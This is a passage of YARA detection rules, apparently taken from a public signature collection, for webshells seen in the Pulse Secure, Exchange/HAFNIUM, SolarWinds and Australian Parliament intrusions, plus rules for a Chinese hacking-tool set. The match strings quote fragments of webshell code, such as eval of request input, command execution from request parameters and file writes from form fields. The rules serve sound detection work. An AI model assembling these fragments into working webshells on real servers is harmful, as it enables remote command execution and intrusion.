		$s1 and $s2 and (@s3[1]<@s4[1]) and (@s4[1]<@s5[1]) and (@s5[1]<@s6[1]) and (#s7>2) and $r1
}
rule SIGNATURE_BASE_FE_APT_Webshell_PL_STEADYPULSE_1 {
    meta:
		description = "Detects samples mentioned in PulseSecure report"
		author = "Mandiant"
		id = "49457fbb-9288-565f-909d-e8228c21c1e4"
		date = "2021-04-16"
		modified = "2023-12-05"
		reference = "https://www.fireeye.com/blog/threat-research/2021/04/suspected-apt-actors-leverage-bypass-techniques-pulse-secure-zero-day.html"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/apt_pulsesecure.yar#L265-L284"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		hash = "168976797d5af7071df257e91fcc31ce1d6e59c72ca9e2f50c8b5b3177ad83cc"
		logic_hash = "a0e3ebdd02ccf5cc8fc0a83c1d0224aed45dc5094eb85bd855e5b74b34e3aaaf"
		score = 75
		quality = 85
		tags = ""

	strings:
		$s1 = "parse_parameters"
		$s2 = "s/\\+/ /g"
		$s3 = "s/%(..)/pack("
		$s4 = "MIME::Base64::encode($"
		$s5 = "$|=1;"
		$s6 = "RC4("
		$s7 = "$FORM{'cmd'}"

	condition:
		all of them
}
rule SIGNATURE_BASE_APT_Webshell_Tiny_1 : FILE {
    meta:
		description = "Detetcs a tiny webshell involved in the Australian Parliament House network compromise"
		author = "Florian Roth (Nextron Systems)"
		id = "e65a8920-0684-5aae-a2b8-079c2beae08a"
		date = "2019-02-18"
		modified = "2023-12-05"
		reference = "https://twitter.com/cyb3rops/status/1097423665472376832"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/apt_aus_parl_compromise.yar#L12-L23"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		logic_hash = "277162f720195c94d36fd3350d0dda785007e8cc6ed2ab2aa1a6a6262f2993fa"
		score = 75
		quality = 85
		tags = "FILE"

	strings:
		$x1 = "eval(" ascii wide

	condition:
		( uint16(0)==0x3f3c or uint16(0)==0x253c) and filesize <40 and $x1
}
rule SIGNATURE_BASE_APT_Webshell_AUS_Tiny_2 : FILE {
    meta:
		description = "Detetcs a tiny webshell involved in the Australian Parliament House network compromise"
		author = "Florian Roth (Nextron Systems)"
		id = "4746d4ce-628a-59b0-9032-7e0759d96ad3"
		date = "2019-02-18"
		modified = "2023-12-05"
		reference = "https://twitter.com/cyb3rops/status/1097423665472376832"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/apt_aus_parl_compromise.yar#L25-L38"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		logic_hash = "e26c265d2b1606257d8c843921601f14cae2beaf246f8e37daeeb6c5ff12f289"
		score = 75
		quality = 85
		tags = "FILE"
		hash1 = "0d6209d86f77a0a69451b0f27b476580c14e0cda15fa6a5003aab57a93e7e5a5"

	strings:
		$x1 = "Request.Item[System.Text.Encoding.UTF8.GetString(Convert.FromBase64String(\"[password]\"))];" ascii
		$x2 = "eval(arguments,System.Text.Encoding.UTF8.GetString(Convert.FromBase64String(\"" ascii

	condition:
		( uint16(0)==0x3f3c or uint16(0)==0x253c) and filesize <1KB and 1 of them
}
rule SIGNATURE_BASE_APT_Webshell_AUS_Jscript_3 : FILE {
    meta:
		description = "Detetcs a webshell involved in the Australian Parliament House network compromise"
		author = "Florian Roth (Nextron Systems)"
		id = "ff7e780b-ccf9-53b6-b741-f04a8cbaf580"
		date = "2019-02-18"
		modified = "2023-12-05"
		reference = "https://twitter.com/cyb3rops/status/1097423665472376832"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/apt_aus_parl_compromise.yar#L40-L53"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		logic_hash = "e144e555dd80e15ac9072a645e629a86ca1a6b52949d236ec3daedbf06bd6718"
		score = 75
		quality = 85
		tags = "FILE"
		hash1 = "7ac6f973f7fccf8c3d58d766dec4ab7eb6867a487aa71bc11d5f05da9322582d"

	strings:
		$s1 = "<%@ Page Language=\"Jscript\" validateRequest=\"false\"%><%try{eval(System.Text.Encoding.UTF8.GetString(Convert.FromBase64String" ascii
		$s2 = ".Item[\"[password]\"])),\"unsafe\");}" ascii

	condition:
		uint16(0)==0x6568 and filesize <1KB and all of them
}
rule SIGNATURE_BASE_APT_Webshell_AUS_4 : FILE {
    meta:
		description = "Detetcs a webshell involved in the Australian Parliament House network compromise"
		author = "Florian Roth (Nextron Systems)"
		id = "bb5b10d1-3528-5361-92fc-8440c65dcda4"
		date = "2019-02-18"
		modified = "2023-12-05"
		reference = "https://twitter.com/cyb3rops/status/1097423665472376832"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/apt_aus_parl_compromise.yar#L56-L71"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		logic_hash = "4a4f26b50631021979e4a8246a1e1c10150f4fb03eb7d77a1042e41ef57b3961"
		score = 75
		quality = 85
		tags = "FILE"
		hash1 = "83321c02339bb51735fbcd9a80c056bd3b89655f3dc41e5fef07ca46af09bb71"

	strings:
		$s1 = "wProxy.Credentials = new System.Net.NetworkCredential(pusr, ppwd);" fullword ascii
		$s2 = "{return System.Text.Encoding.UTF8.GetString(Convert.FromBase64String(" ascii
		$s3 = ".Equals('User-Agent', StringComparison.OrdinalIgnoreCase))" ascii
		$s4 = "gen.Emit(System.Reflection.Emit.OpCodes.Ret);" fullword ascii

	condition:
		uint16(0)==0x7566 and filesize <10KB and 3 of them
}
rule SIGNATURE_BASE_APT_Webshell_AUS_5 : FILE {
    meta:
		description = "Detetcs a webshell involved in the Australian Parliament House network compromise"
		author = "Florian Roth (Nextron Systems)"
		id = "59b3f6aa-2d3b-54b4-b543-57bd9d981e87"
		date = "2019-02-18"
		modified = "2023-12-05"
		reference = "https://twitter.com/cyb3rops/status/1097423665472376832"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/apt_aus_parl_compromise.yar#L92-L111"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		logic_hash = "fb0e53e5561f7f14f2ad6afcda2798d353cf4d54d12ae3354b03d62ed0c00bf3"
		score = 75
		quality = 85
		tags = "FILE"
		hash1 = "54a17fb257db2d09d61af510753fd5aa00537638a81d0a8762a5645b4ef977e4"

	strings:
		$a1 = "function DEC(d){return System.Text.Encoding.UTF8.GetString(Convert.FromBase64String(d));}" fullword ascii
		$a2 = "function ENC(d){return Convert.ToBase64String(System.Text.Encoding.UTF8.GetBytes(d));}" fullword ascii
		$s1 = "var hash=DEC(Request.Item['" ascii
		$s2 = "Response.Write(ENC(SET_ASS_SUCCESS));" fullword ascii
		$s3 = "hashtable[hash] = assCode;" fullword ascii
		$s4 = "Response.Write(ss);" fullword ascii
		$s5 = "var hashtable = Application[CachePtr];" fullword ascii

	condition:
		uint16(0)==0x7566 and filesize <2KB and 4 of them
}
rule SIGNATURE_BASE_LOG_APT_WEBSHELL_Solarwinds_SUNBURST_Report_Webshell_Dec20_2 {
    meta:
		description = "Detects webshell access mentioned in FireEye's SUNBURST report"
		author = "Florian Roth (Nextron Systems)"
		id = "fb86164d-13de-5357-8f52-c597b51127ff"
		date = "2020-12-21"
		modified = "2023-12-05"
		reference = "https://www.guidepointsecurity.com/supernova-solarwinds-net-webshell-analysis/"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/apt_solarwinds_susp_sunburst.yar#L21-L32"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		logic_hash = "ec52e244a483ace0f6932b553b159b23b767c00d1f64a4711e5f359832e846f5"
		score = 75
		quality = 85
		tags = ""

	strings:
		$xr1 = /logoimagehandler.ashx[^\n\s]{1,400}clazz=/ ascii wide

	condition:
		$xr1
}
rule SIGNATURE_BASE_WEBSHELL_ASP_Embedded_Mar21_1 : FILE {
    meta:
		description = "Detects ASP webshells"
		author = "Florian Roth (Nextron Systems)"
		id = "7cf7db9d-8f8a-51db-a0e6-84748e8f9e1f"
		date = "2021-03-05"
		modified = "2023-12-05"
		reference = "Internal Research"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/apt_hafnium.yar#L2-L16"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		logic_hash = "4a8b4cea6f53dad9771cb694ec55f305f04dfdbd8e663154cad672ca414c138c"
		score = 85
		quality = 85
		tags = "FILE"

	strings:
		$s1 = "<script runat=\"server\">" nocase
		$s2 = "new System.IO.StreamWriter(Request.Form["
		$s3 = ".Write(Request.Form["

	condition:
		filesize <100KB and all of them
}
rule SIGNATURE_BASE_APT_WEBSHELL_HAFNIUM_Secchecker_Mar21_1 : FILE {
    meta:
		description = "Detects HAFNIUM SecChecker webshell"
		author = "Florian Roth (Nextron Systems)"
		id = "73db3d78-7ece-53be-9efb-d19801993d5e"
		date = "2021-03-05"
		modified = "2023-12-05"
		reference = "https://twitter.com/markus_neis/status/1367794681237667840"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/apt_hafnium.yar#L18-L33"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		logic_hash = "e0e4df860bdde7d5c277f596535c493d926095be6f46f6ba41b6177afbfc5cd9"
		score = 75
		quality = 85
		tags = "FILE"
		hash1 = "b75f163ca9b9240bf4b37ad92bc7556b40a17e27c2b8ed5c8991385fe07d17d0"

	strings:
		$x1 = "<%if(System.IO.File.Exists(\"c:\\\\program files (x86)\\\\fireeye\\\\xagt.exe" ascii
		$x2 = "\\csfalconservice.exe\")){Response.Write( \"3\");}%></head>" ascii fullword

	condition:
		uint16(0)==0x253c and filesize <1KB and 1 of them or 2 of them
}
rule SIGNATURE_BASE_APT_WEBSHELL_HAFNIUM_Chopper_Webshell : APT HAFNIUM WEBSHELL FILE {
    meta:
		description = "Detects Chopper WebShell Injection Variant (not only Hafnium related)"
		author = "Markus Neis,Swisscom"
		id = "25dcf166-4aea-5680-b161-c5fc8d74b987"
		date = "2021-03-05"
		modified = "2023-12-05"
		reference = "https://www.volexity.com/blog/2021/03/02/active-exploitation-of-microsoft-exchange-zero-day-vulnerabilities/"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/apt_hafnium.yar#L50-L65"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		logic_hash = "c185a8da2a18fa59a8eeb36dbd95ba12c9c61717efc5f2d19d2d5b27ee243f2b"
		score = 75
		quality = 85
		tags = "APT, HAFNIUM, WEBSHELL, FILE"

	strings:
		$x1 = "runat=\"server\">" nocase
		$s1 = "<script language=\"JScript\" runat=\"server\">function Page_Load(){eval(Request" nocase
		$s2 = "protected void Page_Load(object sender, EventArgs e){System.IO.StreamWriter sw = new System.IO.StreamWriter(Request.Form[\"p\"] , false, Encoding.Default);sw.Write(Request.Form[\"f\"]);"
		$s3 = "<script language=\"JScript\" runat=\"server\"> function Page_Load(){eval (Request[\"" nocase

	condition:
		filesize <10KB and $x1 and 1 of ($s*)
}
rule SIGNATURE_BASE_APT_WEBSHELL_Tiny_Webshell : APT HAFNIUM WEBSHELL FILE {
    meta:
		description = "Detects WebShell Injection"
		author = "Markus Neis,Swisscom"
		id = "aa2fcecc-4c8b-570d-a81a-5dfb16c04e05"
		date = "2021-03-05"
		modified = "2023-12-05"
		reference = "https://www.volexity.com/blog/2021/03/02/active-exploitation-of-microsoft-exchange-zero-day-vulnerabilities/"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/apt_hafnium.yar#L67-L82"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		hash = "099c8625c58b315b6c11f5baeb859f4c"
		logic_hash = "9309f9b57353b6fe292048d00794699a8637a3e6e429c562fb36c7e459003a3b"
		score = 75
		quality = 85
		tags = "APT, HAFNIUM, WEBSHELL, FILE"

	strings:
		$x1 = "<%@ Page Language=\"Jscript\" Debug=true%>"
		$s1 = "=Request.Form(\""
		$s2 = "eval("

	condition:
		filesize <300 and all of ($s*) and $x1
}
rule SIGNATURE_BASE_WEBSHELL_ASPX_Sportsball {
    meta:
		description = "The SPORTSBALL webshell allows attackers to upload files or execute commands on the system."
		author = "threatintel@volexity.com"
		id = "25b23a4c-8fc7-5d6f-b4b5-46fe2c1546d8"
		date = "2021-03-01"
		modified = "2023-12-05"
		reference = "https://www.volexity.com/blog/2021/03/02/active-exploitation-of-microsoft-exchange-zero-day-vulnerabilities/"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/apt_hafnium.yar#L159-L180"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		hash = "2fa06333188795110bba14a482020699a96f76fb1ceb80cbfa2df9d3008b5b0a"
		logic_hash = "5ec5e52922e97a3080d397b69b2f42f09daa995271e218ea085fa2ec4e3abad2"
		score = 75
		quality = 85
		tags = ""

	strings:
		$uniq1 = "HttpCookie newcook = new HttpCookie(\"fqrspt\", HttpContext.Current.Request.Form"
		$uniq2 = "ZN2aDAB4rXsszEvCLrzgcvQ4oi5J1TuiRULlQbYwldE="
		$var1 = "Result.InnerText = string.Empty;"
		$var2 = "newcook.Expires = DateTime.Now.AddDays("
		$var3 = "System.Diagnostics.Process process = new System.Diagnostics.Process();"
		$var4 = "process.StandardInput.WriteLine(HttpContext.Current.Request.Form[\""
		$var5 = "else if (!string.IsNullOrEmpty(HttpContext.Current.Request.Form[\""
		$var6 = "<input type=\"submit\" value=\"Upload\" />"

	condition:
		any of ($uniq*) or all of ($var*)
}
rule SIGNATURE_BASE_WEBSHELL_CVE_2021_27065_Webshells : CVE_2021_27065 FILE {
    meta:
		description = "Detects web shells dropped by CVE-2021-27065. All actors, not specific to HAFNIUM. TLP:WHITE"
		author = "Joe Hannon, Microsoft Threat Intelligence Center (MSTIC)"
		id = "27677f35-24a3-59cc-a3ad-b83884128da7"
		date = "2021-03-05"
		modified = "2023-12-05"
		reference = "https://www.microsoft.com/security/blog/2021/03/02/hafnium-targeting-exchange-servers/"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/apt_hafnium.yar#L182-L200"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		logic_hash = "71795ba67bc8a4cea06b93da34b6291029ff74b200e37eb66f6ac51a6ff194cd"
		score = 75
		quality = 61
		tags = "CVE-2021-27065, FILE"

	strings:
		$script1 = "script language" ascii wide nocase
		$script2 = "page language" ascii wide nocase
		$script3 = "runat=\"server\"" ascii wide nocase
		$script4 = "/script" ascii wide nocase
		$externalurl = "externalurl" ascii wide nocase
		$internalurl = "internalurl" ascii wide nocase
		$internalauthenticationmethods = "internalauthenticationmethods" ascii wide nocase
		$extendedprotectiontokenchecking = "extendedprotectiontokenchecking" ascii wide nocase

	condition:
		filesize <50KB and any of ($script*) and ($externalurl or $internalurl) and $internalauthenticationmethods and $extendedprotectiontokenchecking
}
rule SIGNATURE_BASE_WEBSHELL_Compiled_Webshell_Mar2021_1 : FILE {
    meta:
		description = "Triggers on temporary pe files containing strings commonly used in webshells."
		author = "Bundesamt fuer Sicherheit in der Informationstechnik"
		id = "9336bd2c-791c-5c3e-9733-724a6a23864a"
		date = "2021-03-05"
		modified = "2021-03-12"
		reference = "https://www.bsi.bund.de/SharedDocs/Downloads/DE/BSI/Cyber-Sicherheit/Vorfaelle/Exchange-Schwachstellen-2021/MSExchange_Schwachstelle_Detektion_Reaktion.pdf"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/apt_hafnium.yar#L275-L295"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		logic_hash = "d2e5f91f7bb50984c491eb9632d3863febc986760e4d03c8255872887ce4dc4a"
		score = 75
		quality = 81
		tags = "FILE"

	strings:
		$x1 = /App_Web_[a-zA-Z0-9]{7,8}.dll/ ascii wide fullword
		$a1 = "~/aspnet_client/" ascii wide nocase
		$a2 = "~/auth/" ascii wide nocase
		$b1 = "JScriptEvaluate" ascii wide fullword
		$c1 = "get_Request" ascii wide fullword
		$c2 = "get_Files" ascii wide fullword
		$c3 = "get_Count" ascii wide fullword
		$c4 = "get_Item" ascii wide fullword
		$c5 = "get_Server" ascii wide fullword

	condition:
		uint16(0)==0x5a4d and filesize >5KB and filesize <40KB and all of ($x*) and 1 of ($a*) and ( all of ($b*) or all of ($c*))
}
rule SIGNATURE_BASE_WEBSHELL_ASPX_Fileexplorer_Mar21_1 : FILE {
    meta:
		description = "Detects Chopper like ASPX Webshells"
		author = "Florian Roth (Nextron Systems)"
		id = "edcaa2a8-6fea-584e-90c2-307a2dfc9f7f"
		date = "2021-03-31"
		modified = "2023-12-05"
		reference = "Internal Research"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/apt_hafnium.yar#L363-L397"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		logic_hash = "7b4ffd222b38e76455fff2650b72bdcaff281323103f342b427013cd3fffdc21"
		score = 80
		quality = 85
		tags = "FILE"
		hash1 = "a8c63c418609c1c291b3e731ca85ded4b3e0fba83f3489c21a3199173b176a75"

	strings:
		$x1 = "<span style=\"background-color: #778899; color: #fff; padding: 5px; cursor: pointer\" onclick=" ascii
		$xc1 = { 3C 61 73 70 3A 48 69 64 64 65 6E 46 69 65 6C 64
               20 72 75 6E 61 74 3D 22 73 65 72 76 65 72 22 20
               49 44 3D 22 ?? ?? ?? ?? ?? 22 20 2F 3E 3C 62 72
               20 2F 3E 3C 62 72 20 2F 3E 20 50 72 6F 63 65 73
               73 20 4E 61 6D 65 3A 3C 61 73 70 3A 54 65 78 74
               42 6F 78 20 49 44 3D }
		$xc2 = { 22 3E 43 6F 6D 6D 61 6E 64 3C 2F 6C 61 62 65 6C
               3E 3C 69 6E 70 75 74 20 69 64 3D 22 ?? ?? ?? ??
               ?? 22 20 74 79 70 65 3D 22 72 61 64 69 6F 22 20
               6E 61 6D 65 3D 22 74 61 62 73 22 3E 3C 6C 61 62
               65 6C 20 66 6F 72 3D 22 ?? ?? ?? ?? ?? 22 3E 46
               69 6C 65 20 45 78 70 6C 6F 72 65 72 3C 2F 6C 61
               62 65 6C 3E 3C 25 2D 2D }
		$r1 = "(Request.Form[" ascii
		$s1 = ".Text + \" Created!\";" ascii
		$s2 = "DriveInfo.GetDrives()" ascii
		$s3 = "Encoding.UTF8.GetString(FromBase64String(str.Replace(" ascii
		$s4 = "encodeURIComponent(btoa(String.fromCharCode.apply(null, new Uint8Array(bytes))));;"

	condition:
		uint16(0)==0x253c and filesize <100KB and (1 of ($x*) or 2 of them ) or 4 of them
}
rule SIGNATURE_BASE_WEBSHELL_ASPX_Chopper_Like_Mar21_1 : FILE {
    meta:
		description = "Detects Chopper like ASPX Webshells"
		author = "Florian Roth (Nextron Systems)"
		id = "a4dc1880-865f-5e20-89a2-3a642c453ef9"
		date = "2021-03-31"
		modified = "2023-12-05"
		reference = "Internal Research"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/apt_hafnium.yar#L399-L416"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		logic_hash = "baa9eb1e3c4ac5ce49d27b1c3f75c8b6590567e25d98761a8b704478f2cee970"
		score = 85
		quality = 85
		tags = "FILE"
		hash1 = "ac44513e5ef93d8cbc17219350682c2246af6d5eb85c1b4302141d94c3b06c90"

	strings:
		$s1 = "http://f/<script language=\"JScript\" runat=\"server\">var _0x" ascii
		$s2 = "));function Page_Load(){var _0x" ascii
		$s3 = ";eval(Request[_0x" ascii
		$s4 = "','orange','unsafe','" ascii

	condition:
		filesize <3KB and 1 of them or 2 of them
}
rule SIGNATURE_BASE_Tools_Cmd : FILE {
    meta:
		description = "Chinese Hacktool Set - file cmd.jSp"
		author = "Florian Roth (Nextron Systems)"
		id = "27c3cb44-9351-52a2-8e14-afade14e3384"
		date = "2015-06-13"
		modified = "2023-12-05"
		reference = "http://tools.zjqhr.com/"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/gen_cn_webshells.yar#L10-L32"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		hash = "02e37b95ef670336dc95331ec73dbb5a86f3ba2b"
		logic_hash = "fe1a157d53bd9a48848f2711844c5e12356652ca01c84c19429c55bbb12ea488"
		score = 75
		quality = 85
		tags = "FILE"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s0 = "if(\"1752393\".equals(request.getParameter(\"Confpwd\"))){" fullword ascii
		$s1 = "java.io.InputStream in = Runtime.getRuntime().exec(request.getParameter(\"Conn\"" ascii
		$s2 = "<%@ page import=\"java.io.*\" %>" fullword ascii
		$s3 = "out.print(\"Hi,Man 2015<br /><!--?Confpwd=023&Conn=ls-->\");" fullword ascii
		$s4 = "while((a=in.read(b))!=-1){" fullword ascii
		$s5 = "out.println(new String(b));" fullword ascii
		$s6 = "out.print(\"</pre>\");" fullword ascii
		$s7 = "out.print(\"<pre>\");" fullword ascii
		$s8 = "int a = -1;" fullword ascii
		$s9 = "byte[] b = new byte[2048];" fullword ascii

	condition:
		filesize <3KB and 7 of them
}
rule SIGNATURE_BASE_Trigger_Drop : FILE {
    meta:
		description = "Chinese Hacktool Set - file trigger_drop.php"
		author = "Florian Roth (Nextron Systems)"
		id = "3b4f32ff-2de2-5689-869a-8a8f55e7fa0c"
		date = "2015-06-13"
		modified = "2023-12-05"
		reference = "http://tools.zjqhr.com/"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/gen_cn_webshells.yar#L35-L51"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		hash = "165dd2d82bf87285c8a53ad1ede6d61a90837ba4"
		logic_hash = "fc998ea5c2a446278823e4336ddc6a22741f82c43fbdcd95b3d12ee6a27b1dd7"
		score = 75
		quality = 85
		tags = "FILE"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s0 = "$_GET['returnto'] = 'database_properties.php';" fullword ascii
		$s1 = "echo('<meta http-equiv=\"refresh\" content=\"0;url=' . $_GET['returnto'] . '\">'" ascii
		$s2 = "@mssql_query('DROP TRIGGER" ascii
		$s3 = "if(empty($_GET['returnto']))" fullword ascii

	condition:
		filesize <5KB and all of them
}
rule SIGNATURE_BASE_Injectionparameters : FILE {
    meta:
		description = "Chinese Hacktool Set - file InjectionParameters.vb"
		author = "Florian Roth (Nextron Systems)"
		id = "a77bd0c6-8857-577f-831a-0fcf2537667e"
		date = "2015-06-13"
		modified = "2023-12-05"
		reference = "http://tools.zjqhr.com/"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/gen_cn_webshells.yar#L53-L67"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		hash = "4f11aa5b3660c45e527606ee33de001f4994e1ea"
		logic_hash = "6bb786256f7154013408323eeb597f91c609a2a26f5ae9e6d61e16bd9c16a577"
		score = 75
		quality = 85
		tags = "FILE"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s0 = "Public Shared ReadOnly Empty As New InjectionParameters(-1, \"\")" fullword ascii
		$s1 = "Public Class InjectionParameters" fullword ascii

	condition:
		filesize <13KB and all of them
}
rule SIGNATURE_BASE_Users_List : FILE {
    meta:
		description = "Chinese Hacktool Set - file users_list.php"
		author = "Florian Roth (Nextron Systems)"
		id = "2d90b593-6b65-502c-aeb0-8f2a3d65afd3"
		date = "2015-06-13"
		modified = "2023-12-05"
		reference = "http://tools.zjqhr.com/"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/gen_cn_webshells.yar#L69-L84"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		hash = "6fba1a1a607198ed232405ccbebf9543037a63ef"
		logic_hash = "debd8e1d882cbbe6e720b86bec3ff3c78393cb225b3f0f9c7725cfced6582e71"
		score = 75
		quality = 85
		tags = "FILE"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s0 = "<a href=\"users_create.php\">Create User</a>" fullword ascii
		$s7 = "$skiplist = array('##MS_AgentSigningCertificate##','NT AUTHORITY\\NETWORK SERVIC" ascii
		$s11 = "&nbsp;<b>Default DB</b>&nbsp;" fullword ascii

	condition:
		filesize <12KB and all of them
}
rule SIGNATURE_BASE_Trigger_Modify : FILE {
    meta:
		description = "Chinese Hacktool Set - file trigger_modify.php"
		author = "Florian Roth (Nextron Systems)"
		id = "a7d65a9f-82de-554c-8f20-7560d2160041"
		date = "2015-06-13"
		modified = "2023-12-05"
		reference = "http://tools.zjqhr.com/"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/gen_cn_webshells.yar#L86-L103"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		hash = "c93cd7a6c3f962381e9bf2b511db9b1639a22de0"
		logic_hash = "6ea0221af9e9a29d3280a01eec69e31e79c358e664d286f8c80259f5e826876c"
		score = 75
		quality = 85
		tags = "FILE"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s1 = "<form name=\"form1\" method=\"post\" action=\"trigger_modify.php?trigger=<?php e" ascii
		$s2 = "$data_query = @mssql_query('sp_helptext \\'' . urldecode($_GET['trigger']) . '" ascii
		$s3 = "if($_POST['query'] != '')" fullword ascii
		$s4 = "$lines[] = 'I am unable to read this trigger.';" fullword ascii
		$s5 = "<b>Modify Trigger</b>" fullword ascii

	condition:
		filesize <15KB and all of them
}
rule SIGNATURE_BASE_Customize : FILE {
    meta:
		description = "Chinese Hacktool Set - file Customize.aspx"
		author = "Florian Roth (Nextron Systems)"
		id = "a69e1234-cc85-5295-a45c-693afdfc368e"
		date = "2015-06-13"
		modified = "2023-12-05"
		reference = "http://tools.zjqhr.com/"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/gen_cn_webshells.yar#L105-L121"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		hash = "db556879dff9a0101a7a26260a5d0dc471242af2"
		logic_hash = "f4e0a7342a01411ae060c9d995072518f2e3299af1b0d396bb319eeec42c1519"
		score = 75
		quality = 85
		tags = "FILE"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s1 = "ds.Clear();ds.Dispose();}else{SqlCommand cm = Conn.CreateCommand();cm.CommandTex" ascii
		$s2 = "c.UseShellExecute=false;c.RedirectStandardOutput=true;c.RedirectStandardError=tr" ascii
		$s3 = "Stream WF=WB.GetResponseStream();FileStream FS=new FileStream(Z2,FileMode.Create" ascii
		$s4 = "R=\"Result\\t|\\t\\r\\nExecute Successfully!\\t|\\t\\r\\n\";}Conn.Close();break;" ascii

	condition:
		filesize <24KB and all of them
}
rule SIGNATURE_BASE_Oracle_Data {
    meta:
		description = "Chinese Hacktool Set - file oracle_data.php"
		author = "Florian Roth (Nextron Systems)"
		id = "faa62dcc-0f59-573c-8722-d07216de151f"
		date = "2015-06-13"
		modified = "2023-12-05"
		reference = "http://tools.zjqhr.com/"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/gen_cn_webshells.yar#L123-L138"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		hash = "6cf070017be117eace4752650ba6cf96d67d2106"
		logic_hash = "1ab9b6c4349dd891103a24a77c93c2abb784d3ed616523f3aaec68b05082983e"
		score = 75
		quality = 85
		tags = ""
